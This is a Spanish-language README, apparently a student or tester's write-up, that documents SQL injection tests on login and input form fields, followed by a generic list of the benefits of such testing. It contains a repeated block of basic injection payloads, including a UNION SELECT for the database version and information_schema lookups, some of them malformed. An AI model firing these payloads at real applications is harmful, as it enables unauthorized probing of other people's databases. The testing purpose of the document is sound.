# Pruebas para inyesiones sql
![image](https://github.com/Echavarriad/Doc/assets/76740912/ec9d2385-1144-4567-849b-78f7bc66f018)

> A través de los campos del formulario de inicio de sesión, se llevaron a cabo diversos métodos, principalmente mediante la ejecución de consultas SQL dirigidas a diferentes tablas, utilizando un conocimiento previo de las mismas

```
querys
' UNION SELECT @@version -- 
' SELECT * FROM information_schema.tables
' SELECT * FROM information_schema.columns WHERE table_name = 'usuarios'
' http://insecure-application.com/products?category=keyboards
' SELECT * FROM users WHERE username = 'nick_name' AND password = 'password'
```
![image](https://github.com/Echavarriad/Doc/assets/76740912/4d8276e1-419c-47f6-8571-97cec374e180)

> A través de los distintos campos de entrada, se llevaron a cabo pruebas de inyección SQL para evaluar la seguridad de los formularios al momento de las consultas.

```
querys
' UNION SELECT @@version -- 
' SELECT * FROM information_schema.tables
' SELECT * FROM information_schema.columns WHERE table_name = 'usuarios'
' http://insecure-application.com/products?category=keyboards
' SELECT * FROM users WHERE username = 'nick_name' AND password = 'password'
```
![image](https://github.com/Echavarriad/Doc/assets/76740912/a6a2c08c-9873-44a4-b477-cced4321effb)

```
querys
' UNION SELECT @@version -- 
' SELECT * FROM information_schema.tables
' SELECT * FROM information_schema.columns WHERE table_name = 'usuarios'
' http://insecure-application.com/products?category=keyboards
' SELECT * FROM users WHERE username = 'nick_name' AND password = 'password'
```

![image](https://github.com/Echavarriad/Doc/assets/76740912/da99f522-0903-4125-a622-c1d7893ef9cc)

```
querys
' UNION SELECT @@version -- 
' SELECT * FROM information_schema.tables
' SELECT * FROM information_schema.columns WHERE table_name = 'usuarios'
' http://insecure-application.com/products?category=keyboards
' SELECT * FROM users WHERE username = 'nick_name' AND password = 'password'
```
### Beneficios de hacer pruebas de software
Realizar pruebas de inyección SQL en aplicaciones web es esencial por varias razones clave:

- Seguridad: Las inyecciones SQL son una de las vulnerabilidades más comunes y peligrosas en aplicaciones web. Las pruebas de inyección SQL ayudan a identificar y mitigar estas vulnerabilidades antes de que los atacantes puedan explotarlas para acceder, manipular o eliminar datos sensibles.

- Protección de Datos: Las aplicaciones web a menudo manejan información crítica y confidencial, como datos de usuarios, información financiera y más. Las pruebas de inyección SQL garantizan que estos datos estén protegidos contra accesos no autorizados o pérdidas.

- Integridad de la Aplicación: Las inyecciones SQL pueden no solo comprometer la seguridad de los datos, sino también afectar la funcionalidad de la aplicación. Las pruebas ayudan a garantizar que la aplicación funcione correctamente y que los datos se almacenen y recuperen de manera confiable.

- Cumplimiento Normativo: Muchas regulaciones y leyes, como el Reglamento General de Protección de Datos (GDPR) en Europa, exigen que las organizaciones protejan los datos de los usuarios. Las pruebas de seguridad, incluyendo las pruebas de inyección SQL, son esenciales para cumplir con estas regulaciones.

- Reputación: Las brechas de seguridad pueden dañar la reputación de una empresa. Las pruebas de inyección SQL ayudan a evitar incidentes de seguridad y a mantener la confianza de los usuarios y clientes.

- Ahorro de Costos: La corrección de vulnerabilidades de seguridad una vez que una aplicación está en producción puede ser costosa y perjudicial para el negocio. Las pruebas tempranas ayudan a evitar costos y tiempo adicionales.



## Conclusion

> En resumen, las pruebas de inyección SQL en campos de formulario son una parte importante de la seguridad de las aplicaciones web. Estas pruebas identifican y mitigan vulnerabilidades críticas que podrían exponer datos confidenciales y comprometer la integridad de las aplicaciones. Al realizar estas pruebas sistemáticamente, puede fortalecer la protección de datos y garantizar que sus aplicaciones web se ejecuten de forma segura y confiable. Invertir en pruebas de inyección SQL no solo protege contra amenazas, sino que también ayuda a proteger la reputación de su organización y ahorrar costos asociados con posibles incidentes de seguridad. En un entorno en evolución, estas pruebas son una parte importante de la ciberseguridad y de la protección de la privacidad del usuario.








